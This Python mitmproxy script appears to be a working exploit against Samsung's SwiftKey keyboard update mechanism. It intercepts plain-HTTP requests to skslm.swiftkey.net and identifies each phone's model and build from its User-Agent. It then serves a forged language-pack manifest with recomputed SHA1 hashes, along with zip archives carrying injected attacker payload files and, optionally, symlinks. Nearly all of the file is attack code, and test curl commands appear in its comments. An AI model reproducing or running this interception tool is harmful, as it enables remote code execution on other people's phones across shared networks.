import os
from libmproxy import proxy, flow
import copy
import json
import time
import re
from netlib import odict
import shutil
import zipfile
import urllib2

# To test the proxy :
# http_proxy=http://localhost:8080 curl -H "User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G900V Build/KOT49H)" http://skslm.swiftkey.net/samsung/downloads/v1.3-USA/az_AZ.zip > az_AZ.zip

# http_proxy=http://localhost:8080 curl -H "User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G900V Build/KOT49H)" http://skslm.swiftkey.net/samsung/downloads/v1.3-USA/languagePacks.json  | jq '.'

# http_proxy=http://localhost:8080 curl -H "User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G900V Build/KOT49H)" http://skslm.swiftkey.net/live_update.zip > live_update.zip

def start(context, argv):
  context.log("Grabbing original manifest")
  languagePackJSON = read_original_language_pack_manifest()

  global modifiedLanguagePackDir
  originalLanguagePackDir = "bin/languagePacks/original/"
  modifiedLanguagePackDir = "bin/languagePacks/modified/"

  create_dir_if_not_exists(originalLanguagePackDir)
  create_dir_if_not_exists(modifiedLanguagePackDir)

  payload_config_file = open("bin/payload_config", "r")
  payload_config_data = payload_config_file.read()
  payload_config_file.close()

  json_phone_config = json.loads(payload_config_data)
  global phoneExploitManifest
  phoneExploitManifest = json_phone_config["phones"]

  context.log("Generating payloads")

  #download the Original Language Packs, if they don't already exist
  for phone_payload in phoneExploitManifest:
    phone_payload["languagePack"] = copy.deepcopy(languagePackJSON)
    full_modded_zip_path = modifiedLanguagePackDir + \
                           phone_payload['ro.product.model']+ "_" + \
                           phone_payload['ro.build.id'] + "/"

    create_dir_if_not_exists(full_modded_zip_path)

    liveZipUpdateName = full_modded_zip_path + "live_update.zip"

    try:
        os.remove(liveZipUpdateName)
    except OSError:
        pass

    for f in phone_payload['files']:
      payload_file = open(f['payloadFileLocation'], "r")
      payload_data = payload_file.read()
      payload_file.close()
      injectIntoZip(liveZipUpdateName, f['targetFileLocation'], payload_data)

    live_sha1 = sha1OfFile(liveZipUpdateName)

    live_update = {}
    live_update['archive'] = "http://skslm.swiftkey.net/live_update.zip"
    live_update['sha1'] = live_sha1
    live_update['version'] = 8000

    for lp in phone_payload["languagePack"]:
      lpUrl = lp['archive']
      _, lpZipName = os.path.split(lpUrl)

      fullOrigLpZipName = originalLanguagePackDir +  lpZipName
      fullModdedLpZipName = full_modded_zip_path + lpZipName

      # download the languagePack if we don't already have it
      if not os.path.isfile(fullOrigLpZipName):
        print "Downloading: " + lpZipName
        lpRequest = urllib2.urlopen(lpUrl)
        output = open(fullOrigLpZipName, "w")
        output.write(lpRequest.read())
        output.close()

      shutil.copy2(fullOrigLpZipName, fullModdedLpZipName)

      lp['live'] =  live_update

      for f in phone_payload['files']:
        payload_file = open(f['payloadFileLocation'], "r")
        payload_data = payload_file.read()
        payload_file.close()
        injectIntoZip(fullModdedLpZipName, f['targetFileLocation'], payload_data)

      sha1 = sha1OfFile(fullModdedLpZipName)
      lp['sha1'] = sha1

def __getHeadersHash(odictHeaders):
    headers = {}
    for header, headerValue in odictHeaders:
      headers[header] = headerValue
    return headers

def extract_id_and_model(user_agent):
  model_and_info_regex = re.compile("Dalvik/[0-9.]+ \([^;]+;[^;]+;[^;]+;([^)]+)")
  model_and_build_str = model_and_info_regex.search(user_agent).groups()[0]
  model_and_build_groups = re.compile("([^ ]+)").findall(model_and_build_str)
  model = model_and_build_groups[0]
  build_tmp = model_and_build_groups[1]
  build = build_tmp[build_tmp.rfind("/") + 1:]
  return [model, build]

def response(context, flow):
    flow.response.headers["ETag"] = []
    flow.response.headers["Via"] = []
    flow.response.headers["Last-Modified"] = []
    flow.response.headers["X-Amz-Cf-Id"] = []
    flow.response.headers["Age"] = []
    flow.response.headers["Cache-Control"] = []
    flow.response.headers["Date"] = []
    flow.response.headers["X-Cache"] = []
    flow.response.headers["x-amz-meta-s3cmd-attrs"] = []

    if(flow.request.headers['Host'] == ["skslm.swiftkey.net"] and \
       flow.request.path.startswith("/samsung/downloads/")  and \
       flow.request.path.endswith("languagePacks.json")):
      context.log(flow.response.headers)
      context.log("Serving manifest")
      ua = flow.request.headers["User-Agent"][0]
      model, build = extract_id_and_model(ua)
      found = False
      for phone in phoneExploitManifest:
        if phone["ro.product.model"] == model and phone["ro.build.id"] == build:
          found = True
          flow.response.code = 200
          flow.response.content = json.dumps(phone["languagePack"])
      if found:
        context.log("We have proper cache for model: " \
                            + model + ", build: " + build)
      else:
        context.log("No cache found for model: "  + model + " build " + build)
    elif flow.request.headers['Host'] == ["skslm.swiftkey.net"] \
     and flow.request.path.endswith(".zip"):
      context.log("Serving payload")
      _, lpZipName = os.path.split(flow.request.path)
      ua = flow.request.headers["User-Agent"][0]
      model, build = extract_id_and_model(ua)
      full_modded_file_path = modifiedLanguagePackDir + \
                               model + "_" + build + "/"  + lpZipName
      context.log("Serving: " + full_modded_file_path)
      z = open(full_modded_file_path, "r")
      moddedZip = z.read()
      z.close()
      flow.response.code = 200
      flow.response.content = moddedZip
      flow.response.headers['Content-Length'] = [str(len(moddedZip))]
      flow.response.headers['Content-Type'] = ["application/zip"]

def create_dir_if_not_exists(f):
  if not os.path.exists(f):
    os.makedirs(f)

def injectIntoZip(zipFilePath, zipEntryName, zipEntryData):
  zf = zipfile.ZipFile(zipFilePath, "a", zipfile.ZIP_DEFLATED)
  info = zipfile.ZipInfo(zipEntryName)
  info.external_attr = 660 << 16L
  zf.writestr(info, zipEntryData)
  zf.close()

def injectSymlinkIntoZip(zipFilePath, linkSrc, linkDst):
#attempt to write a symlink
  zf = zipfile.ZipFile(zipFilePath, "a")
  a  =  zipfile.ZipInfo()
  a.filename  = linkSrc
  a.create_system  =  3
  a.external_attr  = 0xA1ED0000L
  zf.writestr(a, linkDst)
  zf.close()

def sha1OfFile(filepath):
    import hashlib
    with open(filepath, 'rb') as f:
        return hashlib.sha1(f.read()).hexdigest()

def read_original_language_pack_manifest():
  request = urllib2.urlopen("http://skslm.swiftkey.net/samsung/downloads/v1.3-USA/languagePacks.json")
  return json.loads(request.read())
